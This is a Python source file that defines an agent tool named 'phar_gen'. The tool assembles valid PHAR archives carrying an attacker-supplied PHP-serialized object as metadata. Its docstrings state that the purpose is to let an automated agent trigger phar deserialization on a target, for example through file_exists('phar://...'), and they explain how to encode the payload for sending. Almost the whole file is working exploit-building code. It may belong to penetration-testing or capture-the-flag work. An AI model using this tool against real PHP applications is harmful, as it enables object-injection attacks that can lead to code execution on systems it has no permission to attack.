"""phar_gen capability: build a valid phar archive whose metadata is a serialized PHP
object, so the agent can drive phar-deserialization (the classic `file_exists("phar://x")`
trigger) without PHP on the box.

This only handles the *mechanical* phar binary format (stub, manifest layout, CRC32,
SHA256 signature). The agent still has to figure out the target class structure and the
serialized object to embed — that part is the actual reasoning, not this tool.
"""

import base64
import hashlib
import struct
import zlib

from core.agent import Tool

_STUB = b"<?php __HALT_COMPILER(); ?>\r\n"
_SIGNATURE_SHA256 = 0x03
_FLAG_HAS_SIGNATURE = 0x00010000


def build_phar(metadata: bytes, entry: str = "x", entry_content: bytes = b"") -> bytes:
    """Assemble a minimal phar with one entry and the given serialized metadata.

    `metadata` is a PHP-serialized object (e.g. O:4:"File":2:{...}). `entry` is the archive
    name referenced as phar://<file>/<entry>; `entry_content` is that entry's bytes.
    """
    entry_b = entry.encode("latin-1")
    manifest = b"".join([
        struct.pack("<I", 1),                                # number of files
        struct.pack("<H", 0x0011),                           # phar API version 1.1
        struct.pack("<I", _FLAG_HAS_SIGNATURE),              # global flags
        struct.pack("<I", 0),                                # alias length
        struct.pack("<I", len(metadata)),                    # metadata length
        metadata,                                            # metadata (the payload)
        struct.pack("<I", len(entry_b)),                     # entry filename length
        entry_b,                                             # entry filename
        struct.pack("<I", len(entry_content)),               # uncompressed size
        struct.pack("<I", 0),                                # timestamp
        struct.pack("<I", len(entry_content)),               # compressed size (stored)
        struct.pack("<I", zlib.crc32(entry_content) & 0xFFFFFFFF),  # CRC32
        struct.pack("<I", 0),                                # per-entry flags (no compression)
        struct.pack("<I", 0),                                # per-entry metadata length
        entry_content,                                       # entry content
    ])
    body = _STUB + struct.pack("<I", len(manifest)) + manifest
    signature = hashlib.sha256(body).digest()
    # PHP lays the trailer out as: signature bytes, then signature type, then "GBMB".
    return body + signature + struct.pack("<I", _SIGNATURE_SHA256) + b"GBMB"


def phar_tool() -> Tool:
    def handler(args: dict) -> str:
        metadata = args.get("metadata", "")
        entry = args.get("entry", "x") or "x"
        entry_content = args.get("entry_content", "")
        try:
            meta_b = metadata.encode("latin-1")
            content_b = entry_content.encode("latin-1")
        except Exception as error:
            return f"Error: {error}"
        phar = build_phar(meta_b, entry, content_b)
        # Return base64 so the agent can URL-encode the raw bytes before sending them.
        return base64.b64encode(phar).decode("ascii")

    return Tool(
        name="phar_gen",
        description=(
            "Build a valid PHAR archive whose metadata is a PHP-serialized object, for phar "
            "deserialization (e.g. passing phar://<file>/<entry> to file_exists()/file_get_contents). "
            "`metadata` is the serialized object string (e.g. O:4:\\\"File\\\":2:{...}); `entry` is the "
            "archive name to reference; `entry_content` is optional entry bytes. Returns the phar as "
            "base64 — base64-decode it and URL-encode the raw bytes before sending them as content."
        ),
        parameters={
            "type": "object",
            "properties": {
                "metadata": {"type": "string", "description": "PHP-serialized object to embed as metadata."},
                "entry": {"type": "string", "description": "Archive entry name (default 'x')."},
                "entry_content": {"type": "string", "description": "Optional bytes for that entry."},
            },
            "required": ["metadata"],
        },
        handler=handler,
    )
